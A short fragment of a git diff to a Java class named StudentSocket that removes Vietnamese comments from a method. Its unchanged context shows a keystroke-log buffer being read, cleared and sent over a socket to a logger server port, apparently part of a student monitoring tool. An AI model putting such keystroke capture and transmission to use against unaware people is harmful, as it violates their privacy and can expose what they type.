@@ -68,12 +68,11 @@ public class StudentSocket{
         String dataToSend;
         synchronized (keyLogBuffer) {
             if (keyLogBuffer.length() == 0) {
-                return; // Không có dữ liệu để gửi
+                return;
             }
             dataToSend = keyLogBuffer.toString();
-            keyLogBuffer.setLength(0); // Xóa bộ đệm sau khi lấy dữ liệu
+            keyLogBuffer.setLength(0);
         }
-
         try (Socket socket = new Socket(serverHostName, SERVER_PORT_LOGGER);
              PrintWriter writer = new PrintWriter(socket.getOutputStream(), true)) {
 //            CLIENT_ID = UserHandler.getUserId();
